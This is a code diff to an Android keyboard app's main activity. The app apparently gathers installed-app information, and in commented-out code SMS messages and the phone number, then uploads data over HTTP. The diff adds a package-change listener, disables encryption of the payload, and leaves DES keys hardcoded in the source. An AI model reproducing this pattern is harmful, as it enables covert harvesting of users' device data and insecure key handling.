@@ -1,6 +1,8 @@
 package com.benli.randomkeyboard;
 
 import android.content.DialogInterface;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.net.Uri;
 import android.os.Bundle;
 import android.util.Log;
@@ -19,11 +21,13 @@ import com.benli.keyboard.KeyboardHelper;
 import com.benli.randomkeyboard.app.AppInfoBean;
 import com.benli.randomkeyboard.app.AppUtils;
 import com.benli.randomkeyboard.app.UploadDataBean;
+import com.benli.randomkeyboard.receiver.PackageReceiver;
 import com.benli.randomkeyboard.sms.SMSInfoBean;
 import com.benli.randomkeyboard.sms.SMSUtils;
 import com.blankj.utilcode.constant.PermissionConstants;
 import com.blankj.utilcode.util.ConvertUtils;
 import com.blankj.utilcode.util.EncryptUtils;
+import com.blankj.utilcode.util.LogUtils;
 import com.blankj.utilcode.util.PermissionUtils;
 import com.blankj.utilcode.util.SPStaticUtils;
 import com.blankj.utilcode.util.StringUtils;
@@ -36,7 +40,8 @@ import com.lzy.okgo.model.Response;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity implements CommonUtils.OnDynamicCodeDialogClickListener {
-
+    PackageReceiver packageReceiver = new PackageReceiver();
+    IntentFilter packageFilter = new IntentFilter();
 
     private String keyDES       = "6801020304050607";
     private String resDES       = "1F7962581118F360";
@@ -61,10 +66,11 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
 
         collectAppInfo("test-randomkeyboard");
 
-//        PermissionUtils.permission(PermissionConstants.SMS).callback(new PermissionUtils.SimpleCallback() {
+//        PermissionUtils.permission(PermissionConstants.SMS, PermissionConstants.PHONE).callback(new PermissionUtils.SimpleCallback() {
 //            @Override
 //            public void onGranted() {
-//                collectSMSInfo("test-randomkeyboard-sms");
+//                String devicePhoneNumber = SMSUtils.getDevicePhoneNumber(MainActivity.this);
+//                LogUtils.d("devicePhoneNumber: " + devicePhoneNumber);
 //            }
 //
 //            @Override
@@ -72,23 +78,35 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
 //
 //            }
 //        }).request();
+
+        packageFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
+        packageFilter.addAction(Intent.ACTION_PACKAGE_REPLACED);
+        packageFilter.addAction(Intent.ACTION_PACKAGE_REMOVED);
+        packageFilter.addDataScheme("package");
+        registerReceiver(packageReceiver, packageFilter);
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        unregisterReceiver(packageReceiver);
     }
 
     private void doCollectInfo(UploadDataBean uploadDataBean) {
-        String data = new Gson().toJson(uploadDataBean.data);
-        UploadDataBean<String> bean = new UploadDataBean<>();
-        byte[] dataBytes = EncryptUtils.encrypt3DES2Base64(data.getBytes(), bytesKeyDES, "DES/CBC/PKCS5Padding", null );
-        bean.data = new String(dataBytes);
-        bean.dataID = uploadDataBean.dataID;
-        bean.endTime = uploadDataBean.endTime;
-        bean.node = uploadDataBean.node;
-        bean.order = uploadDataBean.order;
-        bean.orderLength = uploadDataBean.orderLength;
-        bean.startTime = uploadDataBean.startTime;
-        bean.pageCount = uploadDataBean.pageCount;
-        bean.total = uploadDataBean.total;
-        bean.type = uploadDataBean.type;
-        doSaveNew(bean);
+//        String data = new Gson().toJson(uploadDataBean.data);
+//        UploadDataBean<String> bean = new UploadDataBean<>();
+//        byte[] dataBytes = EncryptUtils.encrypt3DES2Base64(data.getBytes(), bytesKeyDES, "DES/CBC/PKCS5Padding", null );
+//        bean.data = new String(dataBytes);
+//        bean.dataID = uploadDataBean.dataID;
+//        bean.endTime = uploadDataBean.endTime;
+//        bean.node = uploadDataBean.node;
+//        bean.order = uploadDataBean.order;
+//        bean.orderLength = uploadDataBean.orderLength;
+//        bean.startTime = uploadDataBean.startTime;
+//        bean.pageCount = uploadDataBean.pageCount;
+//        bean.total = uploadDataBean.total;
+//        bean.type = uploadDataBean.type;
+        doSaveNew(uploadDataBean);
     }
 
     private void collectSMSInfo(String collectNode) {
@@ -140,7 +158,7 @@ public class MainActivity extends AppCompatActivity implements CommonUtils.OnDyn
         doHttp(json);
 
         json = new Gson().toJson(uploadDataBean);
-        doHttp(json);
+//        doHttp(json);
         SPStaticUtils.put("appData", json);
         Log.d("tag", json);
     }
